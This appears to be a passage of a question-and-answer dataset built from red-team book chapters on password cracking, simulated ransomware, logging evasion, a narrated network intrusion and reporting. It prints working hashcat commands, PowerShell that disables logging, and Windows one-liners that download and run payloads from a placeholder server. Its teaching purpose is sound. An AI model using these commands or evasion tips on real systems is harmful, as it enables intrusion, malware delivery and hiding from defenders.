20 minutes.\nThis is when I circle back to the other password lists and rule set\ncombinations. From the first pass of all the large rule sets and large\npassword breach lists, we generally get the 30%+ rate at a minimum.\nNext, we can start adding characters to the right of the password lists\nto improve our chances of longer password requirements. The -a 6\nswitch command seen below will add every alpha/num/special\ncharacter to the right of a password starting with one character all the\nway up to four characters:\n[hashcat] -i -a 6 ./lists/found.2015.txt ?a?a?a?a\nNote: This takes about 30 minutes to get to four\ncharacters\nWe can also add characters to the left of the password lists. The\nfollowing command will add every alpha/num/special character to\nthe left of a password starting with one character all the way up to\nfour characters:\n[hashcat] -i -a 7 ?a?a?a?a ./lists/40GB_Unique_File.txt\nNote: This takes about 30 minutes to get to four characters\nHashcat Utils: https://github.com/hashcat/hashcat-utils/releases.\nHashcat has a bunch of tools to help build better password lists. One\nexample is combinator, which can take two or three different\npassword lists and make combinations. Using small lists is relatively\nquick. Taking our shortKrak list and combining it with itself results\nin a very fast crack:\n./hashcat-utils-1.8/bin/combinator.bin lists/shortKrak.txt\nlists/shortKrak.txt > lists/comboshortKrak.txt\nTaking lists like the top Google 1000 words results in a file that is\nabout 1.4 GB, so you will have to be careful of how large of a file\nyou choose.\n./hashcat-utils-1.8/bin/combinator.bin\nlists/google_top_1000.txt lists/google_top_1000.txt >\nlists/google_top_1000_combo.txt\nNote: taking a 4MB file and running combinator will\nresult in a file that is greater than 25GB of storage. So, be\ncautious of how big these files are.\nMany times, the passwords people use are not common dictionary\nwords, but words based on their company, products, or services. We\ncan create custom password lists using the client websites. Two\ntools that can assist are:\nBrutescrape - https://github.com/cheetz/brutescrape\nBurp Word List Extractor -\nhttps://portswigger.net/bappstore/21df56baa03d499c8439018fe075d3d7\nNext, take all of your cracked passwords, analyze them, and create\nmasks using https://thesprawl.org/projects/pack/:\npython ./PACK-0.0.4/statsgen.py hashes.password\npython ./PACK-0.0.4/statsgen.py hashes.password --\nminlength=10 -o hashes.masks\npython ./PACK-0.0.4/maskgen.py hashes.masks --\noptindex -q -o custom-optindex.hcmask\nRun password cracking with your newly created masks:\n[hashcat] -a 3 ./custom-optindex.hcmask\nTake your password lists through Pipal to better understand base\nwords (https://github.com/digininja/pipal):\ncd optpipal\n./pipal.rb hashes.password\nLooking at this list, you might be able to figure out this\ncompany uses resetme12345 as a default password and\ncould be located in Michigan (Detroit, tiger, football).\nWhere do you go from here? There is always great research being done on\ndifferent password generation tools, analyses, and other techniques to find faster\nways to crack passwords. Some starting resources:\nA Deep Learning Approach for Password Guessing -\nhttps://github.com/brannondorsey/PassGAN\nFast, Lean, and Accurate: Modeling Password Guessability Using\nNeural Networks -\nhttps://www.usenix.org/conference/usenixsecurity16/technical-\nsessions/presentation/melicher\nCreative Campaigns\nBeing on an internal Red Team for a corporation provides the opportunity for\ncreative campaigns. One of my favorite campaigns is to simulate ransomware.\nIn the past, we have been allowed to run simulated ransomware campaigns\nduring the WannaCry era. As cryptoware/ransomware is becoming more and\nmore popular, we really need to be able to test our business recovery/disaster\nrecovery procedures. We all witnessed this in real life with WannaCry, which\nmoved laterally through SMB shares, utilized exploits like EternalBlue,\nencrypted files, and even deleted all backups on the host system. As an IT\norganization, the question we need to ask ourselves is, if one of our users clicked\non that malware, what would have been the impact? Could we have recovered\nuser files, share files, databases, and more? The answer we hear all the time is,\n\"I think so…\", but without a Red Team to validate the processes in advance, we\nend up waiting until after our house is burnt to the ground to know the true\nanswer.\nThis is why I love having internal Red Teams for organizations. We can really\nprove and validate if security and IT is working, all within a controlled\nenvironment. For this THP book, I did not include any of our examples of\nransomware, due to the fact that it is very risky to do. I will leave it up to you to\nbuild the tools and test your clients in an approved method.\nSimulated Ransomware Tips:\nSome organizations won't actually let you delete/encrypt files. For\nthose companies, you can do a simulated ransomware breach. Once\nthe malware is executed, all it will do is scan the host/network for\nimportant files, read each file into memory, do a byte for random\nbyte swap, send those bytes to a C2 server, and include metadata.\nThis will demonstrate how many files you were able to touch, how\nmuch data you could exfiltrate out of their network before they detect\nthe traffic, and what files they could recover.\nLook at other ransomware samples to see what file types they were\nencrypting. This could make for a more realistic campaign. For\nexample, look at the file types from WannaCry\n(https://gist.github.com/rain-\n1/989428fa5504f378b993ee6efbc0b168).\nIf you are going to \"encrypt\" malware, do it with something simple.\nIt could be a standard AES with a key, a public/private x509 cert, or\nsome sort of bitwise XOR. The more complicated you make it, the\nhigher the chance of not being able to recover the files.\nTest, test, and test. The worst thing you could do is find out the\ncompany can't recover critical files and your decryption process does\nnot work.\nMany next gen AVs automatically block ransomware based on\ncertain actions in a chain. For example, a normal detection that\nransomware might perform is: scan the system for all files of type X,\nencrypt a file, delete the shadow volume copy, and disable backups.\nTo get around the detection process, try either slowing this activity\ndown or finding ways to get these same tactics executed, but through\na different processes.\nDisabling PS Logging\nAs Red Teamers, we are always looking for unique ways to try and disable any\nsort of logging. Although there are ways to perform these attacks, we still\ncontinually search for new and easy techniques.\nHere is an example by leechristensen\n(https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs)\nthat could be used to disable PowerShell logging:\n$EtwProvider =\n[Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static');\n$EventProvider = New-Object\nSystem.Diagnostics.Eventing.EventProvider -ArgumentList\n@([Guid]::NewGuid());\n$EtwProvider.SetValue($null, $EventProvider);\nWindows Download File from Internet Command\nLine\nIf you do get command execution through an application vulnerability or have\nshell access through an Office file or PDF, the next steps could be to download\nand execute your secondary malware. For those cases, there are Windows\n\"features\" we can abuse to get the job done. Most of these examples come from\nthe great research of arno0x0x and @subtee\n(https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-\nremote-payload-and-execute-arbitrary-code/):\nmshta\nvbscript:Close(Execute(\"GetObject(\"\"script:http://webserver/payload.sct\"\")\"))\nmshta http://webserver/payload.hta\nrundll32.exe\njavascript:\"\\..\\mshtml,RunHTMLApplication\";o=GetObject(\"script:http://webserver/payload.sct\");window.close();\nregsvr32 u n s i:http://webserver/payload.sct scrobj.dll\ncertutil -urlcache -split -f http://webserver/payload payload\ncertutil -urlcache -split -f http://webserver/payload.b64 payload.b64\n& certutil -decode payload.b64 payload.dll &\nC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil\nlogfile= LogToConsole=false /u payload.dll\ncertutil -urlcache -split -f http://webserver/payload.b64 payload.b64\n& certutil -decode payload.b64 payload.exe & payload.exe\nThese are just a few examples, but there are plenty more methods of getting your\nsecondary code execution through a command line. It is up to you to find the\nother techniques to hide from traditional logging.\nGetting System from Local Admin\nGetting from a local administrator account to System can be done in a variety of\nways. The most common way, of course, is using Metasploit's getsystem, but\nthat isn't always available. decoder-it (https://github.com/decoder-\nit/psgetsystem) created an awesome PowerShell script to go from a Local\nAdministrative PowerShell prompt to System by creating a new process which\nsets its parent PID of that new process to be owned by System. This PowerShell\ncan be found here: https://github.com/decoder-it/psgetsystem and executed with\nthe following:\nPS> . .\\psgetsys.ps1\nPS>\n[MyProcess]::CreateProcessFromParent(<process_run_by_system>,\n<command_to_execute>)\nRetrieving NTLM Hashes without Touching LSASS\nElad Shamir performed extensive research and was able to figure out how to\ngrab NTLM hashes without ever having to touch LSASS. Prior to this attack,\ntouching LSASS to gain hashes via Mimikatz was limited by Credential Guard\nin Windows 10 Enterprise and Windows Server 2016. Elad developed an attack\ncalled Internal Monologue Attack, that does the following:\nDisable NetNTLMv1 preventive controls by changing\nLMCompatibilityLevel, NTLMMinClientSec and\nRestrictSendingNTLMTraffic to appropriate values, as described above.\nRetrieve all non-network logon tokens from currently running processes\nand impersonate the associated users.\nFor each impersonated user, interact with NTLM SSP locally to elicit a\nNetNTLMv1 response to the chosen challenge in the security context of\nthe impersonated user.\nRestore the original values of LMCompatibilityLevel,\nNTLMMinClientSec and RestrictSendingNTLMTraffic.\n[https://github.com/eladshamir/Internal-Monologue]\nBuilding Training Labs and Monitor with Defensive\nTools\nOne of the challenging parts of testing our malware is that we need to set up an\nenvironment for testing very quickly. An awesome tool that Chris Long built\ncalled Detection Lab (https://github.com/clong/DetectionLab) is a collection of\nPacker and Vagrant scripts that allows you to quickly bring a Windows Active\nDirectory online. This tool comes complete with a collection of endpoint\nsecurity tooling and logging best practices. Detection Lab consists of four total\nhosts (https://medium.com/@clong/introducing-detection-lab-61db34bed6ae):\nDC: A Windows 2016 domain controller\nWEF: A Windows 2016 server that manages Windows Event\nCollection\nWin10: A Windows 10 host simulating a non-server endpoint\nLogger: An Ubuntu 16.04 host that runs Splunk and a Fleet server\nConclusion\nWith Red Teams, tips and tricks are part of our craft. We have to continually\nresearch for better ways to attack users, systems, and evade detection. There is\nno magic button. It requires hours to years of practice, sweat, and tears.",
    "question": "What are the methods and resources for efficiently cracking passwords using hashcat and other tools, and how can Red Teams simulate ransomware attacks to test an organization's security and recovery procedures?",
    "summary": "The text discusses using password lists from breaches and powerful hardware like GPUs to crack passwords efficiently, emphasizing the importance of maintaining up-to-date lists and applying rules and masks. It also covers methods for simulating ransomware attacks to test an organization's recovery procedures and techniques for disabling logging to avoid detection. Additionally, it provides resources and tools for password cracking, including hashcat, custom rule sets, and training labs for security testing."
  },
  {
    "start": 128,
    "end": 128,
    "text": "9 two-minute drill - from zero to hero\nWith the clock ticking down, it is the last day of testing and you haven’t had\nmuch success from the outside. You feel the pressure mounting as you need to\ngain access into the environment, understand their corporate layout, get to\nsensitive files/code, pivot to different users and networks, and ultimately break\ninto the classified Cyber Space Kittens program. Your mission was to steal the\nnew rocket secrets and you cannot fail . . . It is time for the two-minute drill.\nWith very little time left on the clock, you need to move the ball from the 10\nyard line, break through all the defensive protection, clean your tracks, and make\nit down 90 yards to the touchdown zone.\n10 Yard Line\nYou go back through all of your notes to figure out what might have been\nmissed. One of the web scrape screen shots captures your eye . . . it is a forum\nwebsite for CSK. You weren't able to find any vulnerabilities in the application,\nbut notice that the CSK forum is used by both employees and public users to\npost questions, comments, and other things about their space program.\nYou scrape all of the users you can find on the site that look like they belong to\ncompany accounts. You then pull out your trusty list of passwords. You run a\nbruteforce attempt on all these accounts with commonly used passwords and\nvariations. Slowly, you see your Python script going . . . failed . . . failled . . .\nfailed . . . password found! You laugh as you see that one of the users, Chris\nCatfield, used the password “Summer2018!”. That was just too easy you think\nto yourself. Next, you log into the forum as Chris, read through all his private\nmessages and posts to figure out the best method to get your initial foothold.\nYou see that Chris regularly talks to another internal employee on the forum,\nNeil Pawstrong, about the space program. It looks like they are not really\nfriends, but have a good working relationship. This is good as it will make the\nnext phish a trusted attack. Using Chris' account, we already have the rapport\nbetween the two users and the likelihood of success is great.\n20 Yard Line\nYou debate whether or not you should send Neil a custom malware payload, as\nthat might be too obvious. Instead, you send a link to a cat photo webpage that\nyou have stood up with the message, “Hey Neil, I know you love cats! Check\nout this page I made!”\nA few minutes later, you get a message back on the forum site from Neil that\nsays, \"LOL, I love space cats!\" Little did Neil realize that the webpage he\nvisited had a custom JavaScript payload that ran code on his machine to scan his\ninternal CSK network and compromise unauthenticated Jenkins and Tomcat\nwebservers. Within a few seconds, you start to get Empire payloads back and let\nout a sigh of relief.\n30 Yard Line\nAs your senses tingle, you know it is only a matter of time before the Blue Team\nstarts putting in firewall/DNS/host blocks, so you have to move quickly.\nFortunately, you have already set up the automation to do a lot of the dirty\nwork. The compromised host beacon activates and starts to run tools like\nBloodhound, look for local passwords, set the registry bit to capture Mimikatz\nLSASS passwords, run SPN and dump all Kerberos tickets, and of course set up\npersistence in scheduled tasks.\n40 Yard Line\nYou know that you need to move quickly off this initial box. You take all the\nKerberos tickets and dump them into Hashcat to start cracking. It's a good thing\nyou found those extra bug bounties to buy a couple of 1080TI GPUs. As they\nstart cracking, you see some service account passwords popping up, but you\ndon't have time for those yet. You review the Bloodhound output and realize\nthat the compromised box belongs to Neil Pawstrong and that his AD account\nhas access to Buzz Clawdrin's box. Using WMI, you remotely spawn another\npayload onto his system and migrate into a process owned by Buzz.\n50 Yard Line\nLuckily for you, you are a local administrator on Buzz's box as well, which\nmeans they must do a lot of joint work. Using the Bloodhound output, you\ntraverse through the network to the CSK-LAB box, but realize that you don't\nhave a local administrative account on this system. No worries, you load up the\nPowerUp PowerShell script and look for misconfigurations on that system which\ncould allow you to get to local admin. Just as you thought, there are a ton of\nunquoted paths for service binaries and you have the ability to write your own\npayload there. You quickly create a new malicious binary that can now be\ntriggered by the local system service.\n60 Yard Line\n60 Yard Line\nYou get a new Cobalt Strike payload on your secondary C2 box, which allows\nyou to maintain access even if they find parts of your campaign. Taking this\nnew connection as System, you pillage through the box and find numerous\ncredentials in text files, stored in browsers, configured in WinSCP, and more.\nThis shared box is a gold mine and has connectivity to multiple servers and\ndatabases. You notice that this machine is on a different VLAN. It looks like\nthis system has access to multiple systems in this network that Neil couldn’t see\nbefore. You run through your commands again, running Bloodhound to\nunderstand what systems you see. You notice that many of these systems behind\nthis network do not have access to the internet, so you can't run HTTP beacons.\nHowever, since you are using Cobalt Strike (https://www.cobaltstrike.com/help-\nsmb-beacon), you know it has a great feature that tunnels your compromised\nsystems through named pipes (SMB). This means that any additional systems\nthat are compromised in the lab network VLAN, will route through the CSK-\nLAB box to get out to the internet. Additionally, from running systeminfo and\ngrabbing Windows Patch levels, you notice that these boxes, which are all part\nof this semi-isolated network, aren't getting updates. It looks like the client\nmachines are all running Windows 7 and haven't been patched for EternalBlue.\n70 Yard Line\nThrough the CSK-LAB box, you use your modified EternalBlue exploit to\nspawn SMB beacon payloads on numerous Windows 7 systems in the lab\nnetwork. With all the new shells, you start pillaging them for information. You\nnotice that one of the systems has active connections to a remote Microsoft SQL\nserver named Restricted. You try all of the accounts on the lab network, but\nnone of the usernames and passwords work for this database. Stumped, you go\nback through all of your notes and realize . . . you forgot about your Kerberos\ntickets! You SSH into your cracking box, review the output, and find the ticket\nlinked to the Restricted database. A huge wave of relief passes over you as you\nfind the password to that service account!\n80 Yard Line\nYou log into the Restricted DB and dump the whole database. You are tempted\nto read it right on the spot, but you know time is limited. You use some of your\nPowerShell-fu to compress and encrypt the dump, then slowly exfiltrate between\nthe different compromised systems, and finally move it off their network onto\nyour C2 server.\nYou did it, you tell yourself, but as you slowly fall out of the happy dance zone,\nyou realize there is still work left to be done. You go back to your different\nBloodhound dumps and notice the path through Purri Gagarin's machine, who is\npart of the HelpDesk group. Awesome—we will be able to use this to Remote\nConnect either to a Domain Admin's box or through Windows ACE, then we can\nreset the password of a Domain Admin to a password of our choice. We go\nahead and reset the password of the Domain Admin, Elon Muskkat, and spawn a\nnew payload as a full DOMAIN ADMIN!\n90 Yard Line\nThe last thing we need to do is dump all the hashes from the domain controller,\nset up additional backdoors, and leave our calling card. Instead of using the loud\nmethod (Shadow Volume Copy) to get all the domain hashes, you run\nMimikatz's DCSync to pull all the user hashes, including the krbtgt ticket. We\nnow have the golden ticket! If we ever decide to come back into the network,\nwe can create our own Kerberos tickets and move straight back to Domain\nAdmin.\nTo continue with more backdoors, we spread all of our techniques on different\nboxes. We set sticky keys on one of the user systems; use backdoorfactory\ntechniques to hide our malware in common binaries on another system;. set a\nscheduled task to run once a week to connect back to one of our subdomains;\ntake one of the segmented lab boxes and replace a useless running service with a\ndnscat binary; and drop a couple of payloads in different systems’ startup\nfolders.\nLuckily for us (but unlucky for them), we haven't been caught yet. However,\nremember the purpose of the Red Team assessment is to see how quickly they\ncan identify malicious activity (which they didn't), and how quickly they\nperform IR/forensics and mitigate all the activity. So, in your last ditch attempt\nto trigger the Blue Team, you run\nhttps://github.com/EmpireProject/Empire/blob/master/data/module_source/trollsploit/Get-\nRickAstley.ps1, enjoy a good laugh, and close your laptop. Mission\naccomplished.\nTouchdown!",
    "question": "What is the main strategy used in the Cyber Space Kittens program penetration test to gain access and exfiltrate data?",
    "summary": "The text describes a cybersecurity exercise where an attacker, under time pressure, uses various techniques to gain access to a secure network. They start by finding a weak password on a forum, then use it to compromise an internal user and move laterally through the network. The attacker exploits a vulnerability in Windows 7 systems to gain access to a database and later resets a Domain Admin password. Finally, they obtain a \"golden ticket\" for Kerberos authentication and set up backdoors to ensure long-term access, while also trying to trigger a response from the Blue Team. The mission is successful in stealing classified information."
  },
  {
    "start": 129,
    "end": 129,
    "text": "10 post game analysis - reporting\nIn the prior THP books, we had examples on how to write penetration test\nreports and provided numerous sample templates. These are great for the\nstandard week style penetration test engagements, but do not translate as well for\nRed Team campaigns. As stated throughout the book, the main focus for Red\nTeams is not to identify vulnerabilities per se (although usually part of the\ncampaign), but to test the people, the tools, the processes, and the skillsets of\nyour employees. If your company was attacked and successfully compromised\nby an actor set or bad guy, what type of grade would you give yourself? I have\nalways been against using gap assessment scores, ISO scores, maturity model\nscores, standard risk analysis, heat graphs, and similar type reports to give a real-\nworld view of your company's security program.\nPersonally, I love to see when companies implement controls from prior Red\nTeam campaigns to test if progress is really being made. For example, for a\nphishing campaign using similar doppelganger style domains, we have seen\ncompanies enable some of the following:\nAlert on Domains similar to their company using DNStwist\nA trusted list of external email domains. Anything external that does\nnot match will append a header to those emails visible to your end\nuser, saying that it is an external (non-company), non-approved email\nsource. This will help your users identify phishing easier.\nAny links in emails that come from domains that are uncategorized\nin the proxy should, at a minimum, have a click through and alert the\nuser that it is uncategorized.\nDisallowing Office Macro Attachments, forcing protected view, and\nsandboxing documents.\nThis is just a small number of easy things a company could implement that could\nstop an attack.\nRemember, Red Teamers only need to find one hole to potentially compromise\nan environment. But, at the same time, Blue Teamers need to only identify one\nof the TTPs (Tactics, Techniques, and Procedures) of an attacker to potentially\nstop a compromise. Therefore, the question now becomes, if one of these TTPs\ndoes alert from your toolset, how quickly will your IR teams see it and react to\nit?\nSo what goes in a Red Team style report? Since Red Teams are still pretty new\nand there is currently no standard report template, we can just customize it to the\nclient's needs. From my perspective, since we may try to get into an\nenvironment multiple times (and get caught a few times) during a full campaign,\nwe want show the good with the bad.\nIn terms of taking notes during the campaign, many of the tools like Empire and\nCobalt Strike, have really good logs of the activities during a campaign, but\nthose might not always be adequate. What I have found to be extremely useful\nfor our team’s campaigns is to stand up a simple web server to record each of the\nactivities a Red Team member performs. Only the most basic information is\ncollected during an engagement, which includes the specific event, servers,\ndescriptions, impacts, any alerts, and screenshots. Most Red\nTeamers/Penetration Testers hate taking notes and something like this provides\nan easy way to track the activity.\nOnce a campaign is finished, we take all of our notes and combine it to build a\nRed Team report that tells a story. The main components in a Red Team Report\nmay include:\nIntroduction/Scope: This section needs to clearly state the goals of\nthe campaign. For example, we have had customers ask us to get to\nspecific data, get to domain admin, get PII, get IP, or find a flag on a\nserver in their production network.\nIndicators: It is extremely helpful for IR/Forensics teams to go\nbackwards after an engagement. We also want to identify where\ntheir tools or sensors might be lacking, disabling them to perform\nforensics or detect malicious activity. Therefore, we want to give\nindicators like IP addresses of C2 servers, domains used, MD5/SHA1\nhashes of binaries, Email addresses and IP information, list of\nvictims that were phished, and any other information that might help\nthe forensics/IR team.\nTimeline of Attack: This is one of the most important parts of a Red\nTeam campaign and where taking good notes pays off. The timeline\nshould adequately state all the major activities, any TTPs that\ntriggered an alert, and major campaign movements. This will allow\nthe Blue Team to compare their timelines and notes to see what gaps\nthey missed. How often in a real attack can you ask the bad guys\nabout everything they did? This is extremely beneficial for the\ndefensive teams to see. An example timeline might look like this:\nTime To Detect (TTD)/Time To Mitigate (TTM): This is usually\nwhere we can work with the Blue Team report to build statistics on\nTTD/TTM. Together, we want to identify how much time it took for\nthe teams to discover each of the multiple intrusions; how much time\npassed, if any, before a scanning event triggered an investigation;\nand how much time it took for the Blue Team to identify the phishing\ncampaigns. The second part should discuss statistics regarding the\namount of time that passed before actions were taken. If there were\nC2 communications that were alerted on or phishing that was\nidentified, how long before the domains were blocked on the firewall\nor DNS servers? We often see where companies might be good at\nblocking domains, but quickly fail when the C2 servers communicate\nover IP (or vice versa). We want to make sure we track this activity\nand identify it for our customers. Another great TTM measurement\nis how quickly they can isolate a confirmed compromised system.\nAs malware becomes more and more automated, we need to start\nutilizing smart and automated processes to isolate systems or parts of\nthe network from the rest of the organization.\nFeedback from the IR/Forensics Staff: One of my favorite things to\ndocument is feedback from the Blue Teams on how they thought the\noverall campaign went from a defensive perspective. What I am\nlooking for is if they felt like they followed policy, if the incident\nlead person drove the investigations, if management got too\ninvolved, how security interacted with IT to make any IT-related\nchanges (firewall blocks, DNS modifications, and so on), and who\npanicked or stayed too calm.\nAs mentioned previously, the purpose of Red Teams is not about\nfinding vulnerabilities or compromising an environment (although\nthat's the fun part); it is about improving an organization's overall\nsecurity program and proving that certain gaps exist in their\nenvironment. Many companies these days are too overconfident in\ntheir security programs, so they don't make changes until they have\nbeen breached. With Red Teams, we can simulate the breach and\nencourage change without a real-life incident.",
    "question": "What is the main purpose of a Red Team campaign and how does it differ from a standard penetration test report?",
    "summary": "Red Team campaigns focus on testing people, tools, processes, and skills rather than just identifying vulnerabilities. They emphasize real-world effectiveness, such as how quickly IR teams detect and respond to threats. A Red Team report should include indicators, a timeline of the attack, and feedback from the Blue Team to highlight security gaps and improvements."
  },
  {
    "start": 130,
    "end": 130,
    "text": "continuing education\nSo the million dollar question I always get is, what do I do now? I have read all\nthe THP books, taken different training courses, and attended a couple of\nconferences. The best advice I can give now is that you should start working on\nsmall projects and contributing to the security community. This is the best way\nto really test your skills and up your game.\nSome ideas that could help:\nSet up a blog and your own Github account: You should be\nwriting about all of your adventures and learnings. Although, you\nare sharing it with the world, it is really more for your own growth.\nHaving to blog about the things you are learning will help you\nimprove your writing, better explain vulnerabilities/exploits in an\neasy-to-understand fashion, and ensure you know the content well\nenough to explain it to the world.\nYour resume should be your Github account: I always tell my\nstudents that your Github account (or blog) should be able to stand\non its own. Whether it is just numerous small security projects, such\nas making tools more efficient and effective, or your own security\nproject, your work should speak volumes on Github.\nSpeaking at local conferences: Speaking can be extremely\ndaunting, but it puts you in leagues above other people if you have it\non your resume. Where can you find places to speak? I would start\nat your local meetups (meetup.com) and find groups to get involved\nwith. They are usually small and everyone is generally pretty\nfriendly. If you are in the southern California area, I founded and\ncurrently run LETHAL (meetup.com/LETHAL), which is a free\ncommunity-driven security group, where different members present\nonce a month. In any case, get involved!\nBug Bounties: No matter if you are on the offensive or defensive\nside, bounty programs can really help you step up your game. Bug\nbounty programs like HackerOne, BugCrowd, and SynAck are free\nto sign up. Not only can you make decent money, but you can also\nlegally hack their sites (staying within the scope of their program, of\ncourse).\nCapture The Flag Competitions: I know it is hard to find time to\ndo all of these things, but I always tell my students that security is\nnot a job—it is a lifestyle. Go on CTFTime.org, pick a few CTFs\nthroughout the year, block off those weekends, and hack away.\nTrust me, you will learn more in a CTF weekend than any class can\nteach you.\nGet with your friends and build out a lab: It is hard to practice\nrealistic scenarios without having a test lab that replicates a\ncorporate environment. Without this test environment, you won't\nreally understand what is happening behind the scenes when running\nall the offensive tools. Therefore, it is imperative to build a full lab\nwith VLANs, Active Directory, servers, GPOs, users and computers,\nLinux environments, Puppet, Jenkins, and all the other common\ntools that you might see.\nLearn from the bad guys: For Red Teams, this is one of the most\nimportant factors. Our campaigns should not be theoretical, but a\nreplication of another real attack. Keep your eyes open for the latest\nAPT reports and make sure to understand how the adversaries are\nchanging their attacks.\nSubscribe to The Hacker Playbook: To keep up with the latest\nTHP news, please subscribe here:\nhttp://thehackerplaybook.com/subscribe/.\nTraining: If you are looking for some training, check us out at\nhttp://thehackerplaybook.com/training/.",
    "question": "What steps should someone take to continue growing their skills and contributing to the security community after reading all the THP books and attending training courses?",
    "summary": "To advance in cybersecurity, focus on hands-on experience through small projects, a blog, and a GitHub account to showcase your skills. Participate in local conferences, bug bounties, and CTF competitions to gain practical knowledge and build your resume. Additionally, create a lab environment to practice real-world scenarios and learn from adversarial tactics by studying APT reports."
  },
  {
    "start": 131,
    "end": 131,
    "text": "about the author\nPeter Kim has been in the information security industry for more than 14 years\nand has been running Penetration Testing/Red Teams for more than 12 years.\nHe has worked for multiple utility companies, Fortune 1000 entertainment\ncompanies, government agencies, and large financial organizations. Although\nhe is most well-known for The Hacker Playbook series, his passions are building\na safe security community, mentoring students, and training others. He founded\nand maintains one of Southern California's largest technical security clubs called\nLETHAL (www.meetup.com/LETHAL), performs private training at his\nwarehouse LETHAL Security (lethalsecurity.com), and runs a boutique\npenetration testing firm called Secure Planet (www.SecurePla.net).\nPeter's main goal with The Hacker Playbook series is to instill passion into his\nreaders and get them to think outside the box. With the ever-changing\nenvironment of security, he wants to help build the next generation of security\nprofessionals.\nFeel free to contact Peter Kim for any of the following:\nQuestions about the book: book@thehackerplaybook.com\nInquiries on private training or Penetration Tests:\nsecure@securepla.net\nTwitter: @hackerplaybook",
    "question": "Who is Peter Kim and what is his main objective in creating The Hacker Playbook series?",
    "summary": "Peter Kim has over 14 years of experience in the information security industry, including more than 12 years in penetration testing and red team operations. He has worked with various organizations, including utility companies, entertainment firms, government agencies, and financial institutions, and is known for his contributions to The Hacker Playbook series. His main goal is to inspire passion and encourage creative thinking in readers to help develop the next generation of security professionals."
  },
  {
    "start": 132,
    "end": 132,
    "text": "special thanks\nContributors\nWalter Pearce\nBill Eyler\nMichael Lim\nBrett Buerhaus\nTom Gadola\nKristen Kim\nAnn Le\nKevin Bang\nTony Dow\nSpecial Thanks\nMark Adams\nSpecterOps\nCasey Smith (@subTee) Ben Ten (@Ben0xA)\nVincent Yiu (@vysecurity) Chris Spehn (@ConsciousHacker) Barrett Adams\n(peewpw) Daniel Bohannon (@danielbohannon) Sean Metcalf (@PyroTek3)\n@harmj0y\nMatt Graeber (@mattifestation) Matt Nelson (@enigma0x3) Ruben Boonen\n(@FuzzySec) Ben Campbell (@Meatballs__) Andrew Robbins (@_wald0)\nRaphael Mudge (@rsmudge) Daniel Miessler (@DanielMiessler) Gianni Amato\n(guelfoweb) Ahmed Aboul-Ela (aboul3la) Lee Baird (leebaird) Dylan Ayrey\n(dxa4481) Rapid7 (@rapid7)\nWill Schroeder (@harmj0y) Ron Bowes (@iagox86) SensePost\nSekirkity\nByt3bl33d3r\nKarim Shoair (D4Vinci) Chris Truncer\nAnshuman Bhartiya\nOJ Reeves\nBen Sadeghipour (@nahamsec) Tim Medin (nidem)\nGianni Amato\nRobert David Graham blechschmidt\nJamieson O'Reilly\nNikhil Mittal (SamratAshok) Michael (codingo)\nCn33liz\nSwissky (Swisskyrepo) Robin Wood (digininja) TrustedSec\nDavid Kennedy (@HackingDave) FireEye\nIgandx\nAlexander Innes (leostat) ActiveBreach (mdsecactivebreach) bbb31\npentestgeek\nSECFORCE\nSteve Micallef\nSpiderLabs\nH.D. Moore\nTheRook\nAhmed Aboul-Ela (aboul3la) Emilio (epinna)\nDylan Ayrey (dxa4481) George Chatzisofroniou (sophron) Derv (derv82)\nGarrett Gee\nHackerWarehouse\nLETHAL\nn00py",
    "question": "Who are the contributors and individuals acknowledged with \"special thanks\" in the text?",
    "summary": "The text lists contributors and special thanks to various individuals and organizations in the cybersecurity community. It includes names of people and groups who have provided support or resources. The main ideas are recognition of their contributions and the collaborative nature of the cybersecurity field."
  }
]